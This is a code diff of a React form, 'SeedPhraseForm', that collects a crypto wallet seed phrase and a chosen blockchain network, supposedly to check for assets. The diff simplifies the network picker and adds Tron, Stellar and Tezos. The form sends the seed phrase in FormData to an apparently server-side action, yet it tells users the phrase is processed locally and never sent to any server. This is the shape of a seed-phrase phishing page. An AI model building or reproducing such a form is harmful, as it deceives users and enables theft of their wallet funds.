@@ -4,7 +4,7 @@ import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
-import { Loader2, Check, ChevronsUpDown } from "lucide-react";
+import { Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import {
   Form,
@@ -15,27 +15,18 @@ import {
   FormLabel,
   FormMessage,
 } from "@/components/ui/form";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
 import { Textarea } from "@/components/ui/textarea";
-import {
-  Command,
-  CommandEmpty,
-  CommandGroup,
-  CommandInput,
-  CommandItem,
-  CommandList,
-} from "@/components/ui/command";
-import {
-  Popover,
-  PopoverContent,
-  PopoverTrigger,
-} from "@/components/ui/popover";
 import { Card, CardContent } from "@/components/ui/card";
 import { handleFetchData } from "@/app/actions";
 import { useToast } from "@/hooks/use-toast";
 import type { WalletData } from "@/app/actions";
-import { cn } from "@/lib/utils";
-import { Badge } from "@/components/ui/badge";
-
 
 const networks = [
   { id: "Bitcoin", label: "Bitcoin" },
@@ -48,8 +39,10 @@ const networks = [
   { id: "Polkadot", label: "Polkadot" },
   { id: "Litecoin", label: "Litecoin" },
   { id: "Chainlink", label: "Chainlink" },
+  { id: "Tron", label: "Tron" },
+  { id: "Stellar", label: "Stellar" },
+  { id: "Tezos", label: "Tezos" },
 ] as const;
-
 
 const formSchema = z.object({
   seedPhrase: z
@@ -60,8 +53,8 @@ const formSchema = z.object({
       (phrase) => phrase.split(/\s+/).filter(Boolean).length >= 12,
       "A valid seed phrase must contain at least 12 words."
     ),
-  networks: z.array(z.string()).refine((value) => value.length > 0, {
-    message: "You have to select at least one network.",
+  network: z.string({
+    required_error: "Please select a network.",
   }),
 });
 
@@ -76,13 +69,12 @@ export function SeedPhraseForm({
 }: SeedPhraseFormProps) {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { toast } = useToast();
-   const [popoverOpen, setPopoverOpen] = useState(false);
 
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
       seedPhrase: "",
-      networks: ["Bitcoin", "Ethereum", "Solana"],
+      network: "Ethereum",
     },
   });
 
@@ -92,9 +84,7 @@ export function SeedPhraseForm({
 
     const formData = new FormData();
     formData.append("seedPhrase", values.seedPhrase);
-    values.networks.forEach(network => {
-        formData.append("networks", network);
-    });
+    formData.append("network", values.network);
 
     const result = await handleFetchData(formData);
 
@@ -140,80 +130,39 @@ export function SeedPhraseForm({
 
             <FormField
               control={form.control}
-              name="networks"
+              name="network"
               render={({ field }) => (
-                <FormItem className="flex flex-col">
-                  <FormLabel>Blockchain Networks</FormLabel>
-                   <Popover open={popoverOpen} onOpenChange={setPopoverOpen}>
-                    <PopoverTrigger asChild>
-                      <FormControl>
-                        <Button
-                          variant="outline"
-                          role="combobox"
-                          className={cn(
-                            "w-full justify-between",
-                            !field.value && "text-muted-foreground"
-                          )}
-                        >
-                          <div className="flex gap-1 flex-wrap">
-                            {field.value.length > 0 ? (
-                                field.value.map((net) => (
-                                    <Badge variant="secondary" key={net}>{net}</Badge>
-                                ))
-                            ) : (
-                                "Select networks"
-                            )}
-                          </div>
-                          <ChevronsUpDown className="ml-2 h-4 w-4 shrink-0 opacity-50" />
-                        </Button>
-                      </FormControl>
-                    </PopoverTrigger>
-                    <PopoverContent className="w-[--radix-popover-trigger-width] p-0">
-                       <Command>
-                        <CommandInput placeholder="Search networks..." />
-                        <CommandList>
-                            <CommandEmpty>No network found.</CommandEmpty>
-                            <CommandGroup>
-                            {networks.map((item) => (
-                                <CommandItem
-                                    key={item.id}
-                                    onSelect={() => {
-                                        const currentValue = field.value || [];
-                                        const isSelected = currentValue.includes(item.id);
-                                        const newValue = isSelected
-                                        ? currentValue.filter((id) => id !== item.id)
-                                        : [...currentValue, item.id];
-                                        field.onChange(newValue);
-                                    }}
-                                    >
-                                    <Check
-                                        className={cn(
-                                        "mr-2 h-4 w-4",
-                                        (field.value || []).includes(item.id)
-                                            ? "opacity-100"
-                                            : "opacity-0"
-                                        )}
-                                    />
-                                    {item.label}
-                                    </CommandItem>
-                                ))}
-                            </CommandGroup>
-                        </CommandList>
-                       </Command>
-                    </PopoverContent>
-                  </Popover>
+                <FormItem>
+                  <FormLabel>Blockchain Network</FormLabel>
+                  <Select
+                    onValueChange={field.onChange}
+                    defaultValue={field.value}
+                  >
+                    <FormControl>
+                      <SelectTrigger>
+                        <SelectValue placeholder="Select a network" />
+                      </SelectTrigger>
+                    </FormControl>
+                    <SelectContent>
+                      {networks.map((network) => (
+                        <SelectItem key={network.id} value={network.id}>
+                          {network.label}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
                   <FormDescription>
-                    Select the networks to check for assets.
+                    Select the network to check for assets.
                   </FormDescription>
                   <FormMessage />
                 </FormItem>
               )}
             />
-            
-            <FormDescription className="pt-4">
-                Your seed phrase is processed locally in your browser and is never sent to our servers.
-            </FormDescription>
 
+            <FormDescription className="pt-4">
+              Your seed phrase is processed locally in your browser and is never
+              sent to our servers.
+            </FormDescription>
 
             <Button
               type="submit"
